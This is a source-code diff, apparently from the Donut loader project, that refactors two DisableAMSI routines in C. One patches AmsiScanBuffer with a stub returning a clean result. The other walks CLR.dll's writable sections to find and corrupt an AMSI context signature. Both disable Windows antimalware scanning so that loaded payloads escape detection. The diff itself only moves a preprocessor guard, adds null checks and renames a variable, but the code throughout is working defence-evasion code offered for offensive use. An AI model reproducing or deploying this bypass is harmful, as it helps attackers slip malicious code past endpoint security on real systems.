@@ -29,8 +29,6 @@
   OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
 
-#if defined(BYPASS_AMSI_A)
-
 typedef enum _WLDP_HOST_ID { 
    WLDP_HOST_ID_UNKNOWN     = 0,
    WLDP_HOST_ID_GLOBAL      = 1,
@@ -48,6 +46,8 @@ typedef struct _WLDP_HOST_INFORMATION {
   PCWSTR       szSource;
   HANDLE       hSource;
 } WLDP_HOST_INFORMATION, *PWLDP_HOST_INFORMATION;
+
+#if defined(BYPASS_AMSI_A)
 
 // fake function that always returns S_OK and AMSI_RESULT_CLEAN
 HRESULT WINAPI AmsiScanBufferStub(
@@ -161,13 +161,16 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     BOOL           disabled = FALSE;
     PDWORD         Signature;
     
-    // try load amsi
+    // try load amsi. if unable to load, assume
+    // it doesn't exist and return TRUE to indicate
+    // it's okay to continue.
     dll = inst->api.LoadLibraryA(inst->amsi.s);
-      
-    if(dll == NULL) return FALSE;
+    if(dll == NULL) return TRUE;
     
-    // resolve address of AmsiScanBuffer
+    // resolve address of AmsiScanBuffer. if unable, return
+    // FALSE because it should exist.
     cs = (PBYTE)inst->api.GetProcAddress(dll, inst->amsiScanBuf);
+    if(cs == NULL) return FALSE;
     
     // scan for signature
     for(i=0;;i++) {
@@ -198,7 +201,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
 // https://gist.github.com/mattifestation/ef0132ba4ae3cc136914da32a88106b9
 
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
-    LPVOID                   hCLR;
+    LPVOID                   clr;
     BOOL                     disabled = FALSE;
     PIMAGE_DOS_HEADER        dos;
     PIMAGE_NT_HEADERS        nt;
@@ -208,47 +211,48 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     MEMORY_BASIC_INFORMATION mbi;
     _PHAMSICONTEXT           ctx;
     
-    hCLR = inst->api.GetModuleHandleA(inst->clr);
+    // get address of CLR.dll. if unable, this
+    // probably isn't a dotnet assembly being loaded
+    clr = inst->api.GetModuleHandleA(inst->clr);
+    if(clr == NULL) return FALSE;
     
-    if(hCLR != NULL) {
-      dos = (PIMAGE_DOS_HEADER)hCLR;  
-      nt  = RVA2VA(PIMAGE_NT_HEADERS, hCLR, dos->e_lfanew);  
-      sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
-             nt->FileHeader.SizeOfOptionalHeader);
+    dos = (PIMAGE_DOS_HEADER)clr;  
+    nt  = RVA2VA(PIMAGE_NT_HEADERS, clr, dos->e_lfanew);  
+    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
+      nt->FileHeader.SizeOfOptionalHeader);
              
-      // scan all writeable segments while disabled == FALSE
-      for(i = 0; 
-          i < nt->FileHeader.NumberOfSections && !disabled; 
-          i++) 
-      {
-        // if this section is writeable, assume it's data
-        if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
-          // scan section for pointers to the heap
-          ds = RVA2VA (PBYTE, hCLR, sh[i].VirtualAddress);
+    // scan all writeable segments while disabled == FALSE
+    for(i = 0; 
+        i < nt->FileHeader.NumberOfSections && !disabled; 
+        i++) 
+    {
+      // if this section is writeable, assume it's data
+      if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+        // scan section for pointers to the heap
+        ds = RVA2VA (PBYTE, clr, sh[i].VirtualAddress);
            
-          for(j = 0; 
-              j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
-              j += sizeof(ULONG_PTR)) 
+        for(j = 0; 
+            j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
+            j += sizeof(ULONG_PTR)) 
+        {
+          // get pointer
+          ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
+          // query if the pointer
+          res = inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
+          if(res != sizeof(mbi)) continue;
+          
+          // if it's a pointer to heap or stack
+          if ((mbi.State   == MEM_COMMIT    ) &&
+              (mbi.Type    == MEM_PRIVATE   ) && 
+              (mbi.Protect == PAGE_READWRITE))
           {
-            // get pointer
-            ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
-            // query if the pointer
-            res = inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
-            if(res != sizeof(mbi)) continue;
-            
-            // if it's a pointer to heap or stack
-            if ((mbi.State   == MEM_COMMIT    ) &&
-                (mbi.Type    == MEM_PRIVATE   ) && 
-                (mbi.Protect == PAGE_READWRITE))
-            {
-              ctx = (_PHAMSICONTEXT)ptr;
-              // check if it contains the signature 
-              if(ctx->Signature == inst->amsi.w[0]) {
-                // corrupt it
-                ctx->Signature++;
-                disabled = TRUE;
-                break;
-              }
+            ctx = (_PHAMSICONTEXT)ptr;
+            // check if it contains the signature 
+            if(ctx->Signature == inst->amsi.w[0]) {
+              // corrupt it
+              ctx->Signature++;
+              disabled = TRUE;
+              break;
             }
           }
         }
